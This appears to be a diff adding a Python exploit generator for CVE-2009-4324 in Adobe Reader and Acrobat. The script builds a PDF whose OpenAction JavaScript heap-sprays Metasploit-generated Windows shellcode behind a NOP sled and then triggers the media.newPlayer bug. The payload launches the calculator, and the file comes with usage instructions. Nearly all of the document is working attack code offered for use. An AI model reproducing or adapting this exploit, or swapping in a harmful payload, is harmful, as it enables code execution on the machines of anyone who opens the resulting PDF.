@@ -1,0 +1,150 @@
+#
+#   Author : Ahmed Obied (ahmed.obied@gmail.com)
+#
+#   This program generates a PDF file that exploits a vulnerability (CVE-2009-4324) 
+#   in Adobe Reader and Acrobat. The generated PDF file was tested using Adobe 
+#   Reader 9.2.0 on Windows XP SP3. The exploit's payload spawns the calculator.
+#
+#   Usage  : python adobe_newplayer.py [output file name]
+#   
+
+import sys
+
+class PDF:
+    
+    def __init__(self):
+        self.xrefs = []
+        self.eol = '\x0d\x0a'
+        self.content = ''
+        self.xrefs_offset = 0
+               
+    def header(self):
+        self.content += '%PDF-1.1' + self.eol  
+    
+    def obj(self, obj_num, data):
+        self.xrefs.append(len(self.content))
+        self.content += '%d 0 obj' % obj_num
+        self.content += self.eol + '<< ' + data + ' >>' + self.eol
+        self.content += 'endobj' + self.eol
+    
+    def ref(self, ref_num):
+        return '%d 0 R' % ref_num 
+    
+    def xref(self):
+        self.xrefs_offset = len(self.content)
+        self.content += 'xref' + self.eol
+        self.content += '0 %d' % (len(self.xrefs) + 1)
+        self.content += self.eol
+        self.content += '0000000000 65535 f' + self.eol
+        for i in self.xrefs:
+            self.content += '%010d 00000 n' % i
+            self.content += self.eol
+     
+    def trailer(self):
+        self.content += 'trailer' + self.eol
+        self.content += '<< /Size %d' % (len(self.xrefs) + 1)
+        self.content += ' /Root ' + self.ref(1) + ' >> ' + self.eol
+        self.content += 'startxref' + self.eol
+        self.content += '%d' % self.xrefs_offset
+        self.content += self.eol
+        self.content += '%%EOF'
+        
+    def generate(self):   
+        return self.content
+
+class Exploit:
+    
+    def convert_to_utf16(self, payload):
+        enc_payload = ''
+        for i in range(0, len(payload), 2):
+            num = 0
+            for j in range(0, 2):
+                num += (ord(payload[i + j]) & 0xff) << (j * 8)
+            enc_payload += '%%u%04x' % num
+        return enc_payload
+            
+    def get_payload(self):
+        # win32_exec - EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub
+        # http://metasploit.com
+        payload  = '\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6f'
+        payload += '\x02\xb1\x0e\x83\xeb\xfc\xe2\xf4\x93\xea\xf5\x0e\x6f\x02\x3a\x4b'
+        payload += '\x53\x89\xcd\x0b\x17\x03\x5e\x85\x20\x1a\x3a\x51\x4f\x03\x5a\x47'
+        payload += '\xe4\x36\x3a\x0f\x81\x33\x71\x97\xc3\x86\x71\x7a\x68\xc3\x7b\x03'
+        payload += '\x6e\xc0\x5a\xfa\x54\x56\x95\x0a\x1a\xe7\x3a\x51\x4b\x03\x5a\x68'
+        payload += '\xe4\x0e\xfa\x85\x30\x1e\xb0\xe5\xe4\x1e\x3a\x0f\x84\x8b\xed\x2a'
+        payload += '\x6b\xc1\x80\xce\x0b\x89\xf1\x3e\xea\xc2\xc9\x02\xe4\x42\xbd\x85'
+        payload += '\x1f\x1e\x1c\x85\x07\x0a\x5a\x07\xe4\x82\x01\x0e\x6f\x02\x3a\x66'
+        payload += '\x53\x5d\x80\xf8\x0f\x54\x38\xf6\xec\xc2\xca\x5e\x07\x7c\x69\xec'
+        payload += '\x1c\x6a\x29\xf0\xe5\x0c\xe6\xf1\x88\x61\xd0\x62\x0c\x2c\xd4\x76'
+        payload += '\x0a\x02\xb1\x0e'
+        return self.convert_to_utf16(payload)
+    
+    def get_exploit(self):
+        exploit = '''
+        
+        function spray_heap()
+        {
+            var chunk_size, payload, nopsled;
+            
+            chunk_size = 0x8000;
+            payload = unescape("<PAYLOAD>");
+            nopsled = unescape("<NOP>");
+            while (nopsled.length < chunk_size)
+                nopsled += nopsled;
+            nopsled_len = chunk_size - (payload.length + 20);        
+            nopsled = nopsled.substring(0, nopsled_len);
+            heap_chunks = new Array();
+            for (var i = 0 ; i < <CHUNKS> ; i++)
+                heap_chunks[i] = nopsled + payload;
+        }    
+         
+        function trigger_bug()
+        {
+            util.printd("1.000000000000000000000000 : 0000000", new Date());
+            try {
+                media.newPlayer(null);
+            } catch(e) {}
+            util.printd("1.000000000000000000000000 : 0000000", new Date());
+        }
+        
+        spray_heap();
+        trigger_bug();
+        
+        '''
+        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
+        exploit = exploit.replace('<NOP>', '%u0d0d%u0d0d')
+        exploit = exploit.replace('<CHUNKS>', '1200')      
+        return exploit   
+    
+def generate_pdf():
+        exploit = Exploit()
+        pdf = PDF()
+        pdf.header()
+        pdf.obj(1, '/Type /Catalog /Outlines ' + pdf.ref(2) + ' /Pages ' + pdf.ref(3) + ' /OpenAction ' + pdf.ref(5))
+        pdf.obj(2, '/Type /Outlines /Count 0') 
+        pdf.obj(3, '/Type /Pages /Kids [' + pdf.ref(4) + '] /Count 1')
+        pdf.obj(4, '/Type /Page /Parent ' + pdf.ref(3) + ' /MediaBox [0 0 612 792]')
+        pdf.obj(5, '/Type /Action /S /JavaScript /JS (%s)' % exploit.get_exploit())    
+        pdf.xref()
+        pdf.trailer()
+        return pdf.generate()
+           
+def main():
+    if len(sys.argv) != 2:
+        print 'Usage: python %s [output file name]' % sys.argv[0]
+        sys.exit(0)
+    file_name = sys.argv[1]
+    if not file_name.endswith('.pdf'):
+        file_name = file_name + '.pdf'
+    try:
+        fd = open(file_name, 'w')
+        fd.write(generate_pdf())    
+        fd.close()
+        print '[-] PDF file generated and written to %s' % file_name
+    except IOError:
+        print '[*] Error : An IO error has occurred'
+        print '[-] Exiting ...'
+        sys.exit(-1)
+               
+if __name__ == '__main__':
+    main()
